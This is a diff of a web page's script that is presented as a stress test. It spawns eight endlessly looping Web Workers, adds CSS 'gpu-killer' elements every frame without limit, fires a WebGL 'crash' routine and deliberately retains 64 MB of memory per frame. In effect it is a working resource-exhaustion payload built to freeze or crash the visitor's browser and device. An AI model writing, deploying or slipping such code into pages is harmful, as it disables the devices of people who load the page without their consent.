@@ -165,7 +165,7 @@
 <body>
 
     <div class="header-section">
-        <h1>Device</h1>
+        <h1>Title</h1>
     </div>
 
     <div class="slider-container">
@@ -181,6 +181,49 @@
     <script>
         // Core stress test simulation loop
 function cssAnimationInferno() {
+    // ----------------------------------------------------
+    // 1. BACKGROUND CPU STRESS (8 WEB WORKERS)
+    // ----------------------------------------------------
+    const workerCode = `
+        self.onmessage = function() {
+            // High-intensity mathematical/cryptographic stress loop (Prime95 style)
+            // Designed to maximize CPU core utilization without an infinite blocking while(true)
+            function stressCore() {
+                let salt = 12345.6789;
+                for (let i = 0; i < 5000000; i++) {
+                    // Complex transcendental and trigonometric chaining to stress ALU/FPU
+                    salt = Math.sin(salt) * Math.cos(salt) * Math.tan(salt);
+                    salt = Math.sqrt(Math.abs(salt)) + Math.exp(Math.sin(salt) * 0.001);
+                    
+                    // Bitwise operations mixed with float conversions
+                    let integerRepresentation = Math.floor(salt * 1000000);
+                    salt += ((integerRepresentation ^ (integerRepresentation >> 2)) & 0xFF) * 0.00001;
+                }
+                // Yield to the event loop momentarily, then resume immediately
+                setTimeout(stressCore, 0);
+            }
+            stressCore();
+        };
+    `;
+
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const workers = [];
+
+    // Spawn 8 parallel execution threads
+    for (let w = 0; w < 8; w++) {
+        try {
+            const worker = new Worker(workerUrl);
+            worker.postMessage('start');
+            workers.push(worker);
+        } catch (err) {
+            console.error('Worker allocation failed:', err);
+        }
+    }
+
+    // ----------------------------------------------------
+    // 2. CSS INFERNO SETUP
+    // ----------------------------------------------------
     const style = document.createElement('style');
     if (!document.getElementById('gpu-core-styles')) {
         style.id = 'gpu-core-styles';
@@ -196,60 +239,14 @@ function cssAnimationInferno() {
         document.head.appendChild(style);
     }
 
-    // --- 1. SPAWN 8 WEB WORKERS FOR CPU STRESS (Prime95 style crypto) ---
-    const workerCode = `
-        function isPrime(n) {
-            if (n < 2) return false;
-            for (let i = 2; i <= Math.sqrt(n); i++) {
-                if (n % i === 0) return false;
-            }
-            return true;
-        }
-        function stress() {
-            // Intensive crypto hash simulation combined with heavy prime math
-            let val = 123456789;
-            for (let i = 0; i < 50000; i++) {
-                val = Math.sin(val) * Math.cos(val) * 10000;
-                if(isPrime(Math.floor(Math.abs(val)))) {
-                    val += 7;
-                }
-            }
-            // Use setTimeout to yield control & prevent the actual thread from freezing permanently,
-            // keeping it running at 100% capacity continuously like Prime95.
-            setTimeout(stress, 0);
-        }
-        stress();
-    `;
-
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
-    const workerUrl = URL.createObjectURL(blob);
-    const workers = [];
-    for (let i = 0; i < 8; i++) {
-        workers.push(new Worker(workerUrl));
-    }
-
-    // --- 2. CSS INFERNO & STATE MANAGEMENT ---
     let elementCount = 0;
     let frameCount = 0;
-    let crashTriggered = false;
-    const memoryLeakStorage = []; // Holds memory allocations to prevent garbage collection
-
-    function allocateMemory() {
-        // 64MB = 64 * 1024 * 1024 bytes. 
-        // Float64Array uses 8 bytes per element, so 8,388,608 elements = 64MB
-        try {
-            const size64MB = 8388608;
-            const buffer = new Float64Array(size64MB);
-            // Fill array to force physical RAM allocation
-            buffer.fill(Math.random());
-            memoryLeakStorage.push(buffer);
-        } catch (e) {
-            console.warn("Memory limits reached.");
-        }
-    }
+    let webglTriggered = false;
+    const memoryLeakingRetentionBucket = []; // Holds allocations to prevent Garbage Collection
 
     function createGpuKiller() {
         try {
+            // Keep spawning CSS elements every frame indefinitely
             for (let i = 0; i < 60; i++) {
                 const element = document.createElement('div');
                 element.className = 'gpu-killer';
@@ -268,26 +265,39 @@ function cssAnimationInferno() {
 
             frameCount++;
 
-            // Trigger once precisely on the 3rd frame
-            if (frameCount >= 3 && !crashTriggered) {
-                crashTriggered = true;
-                crash();
+            // Trigger WebGL precisely on the 3rd frame
+            if (frameCount >= 3 && !webglTriggered) {
+                webglTriggered = true;
+                crash(); 
             }
 
-            // Start RAM eating pipeline alongside the CSS animation after the 3rd frame
-            if (crashTriggered) {
-                allocateMemory();
+            // Rapid RAM allocation vector (64MB per frame) once WebGL starts running
+            if (webglTriggered) {
+                // 1 Megabyte = 1024 * 1024 bytes. 64 Megabytes = 67,108,864 bytes.
+                const buffer = new ArrayBuffer(64 * 1024 * 1024);
+                // Fill buffer partially to force physical allocation backed by OS memory pages
+                const view = new Uint8Array(buffer);
+                view[0] = 1;
+                view[view.length - 1] = 1;
+                memoryLeakingRetentionBucket.push(buffer);
             }
 
             if (elementCount > -2146483647) {
                 requestAnimationFrame(createGpuKiller);
             }
         } catch(e) {
+            // Maintain execution flow under degradation
+            if (frameCount >= 3 && !webglTriggered) {
+                webglTriggered = true;
+                crash();
+            }
             requestAnimationFrame(createGpuKiller);
         }
     }
 
-    // --- 3. WEBGL OVERLOAD ROUTINE ---
+    // ----------------------------------------------------
+    // 3. WEBGL GRAPHICS SUBSYSTEM CRASH ROUTINE
+    // ----------------------------------------------------
     function crash() {
         let canvas = document.createElement('canvas');
         canvas.style.position = 'fixed';
@@ -419,7 +429,7 @@ function cssAnimationInferno() {
         renderFrame();
     }
 
-    // Fire off the initialization
+    // Initialize execution loop
     createGpuKiller();
 }
         // Execution Handler
